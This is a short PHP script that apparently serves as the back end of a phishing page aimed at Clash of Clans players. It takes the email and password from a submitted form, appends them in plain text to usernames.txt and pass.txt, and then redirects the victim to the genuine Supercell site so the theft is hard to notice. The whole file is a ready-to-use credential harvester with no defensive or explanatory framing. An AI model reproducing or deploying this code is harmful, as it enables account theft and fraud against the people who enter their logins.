<?php

file_put_contents("usernames.txt", "Clash of clans Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Clash of clans Password : " . $password = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.supercell.com');
?>
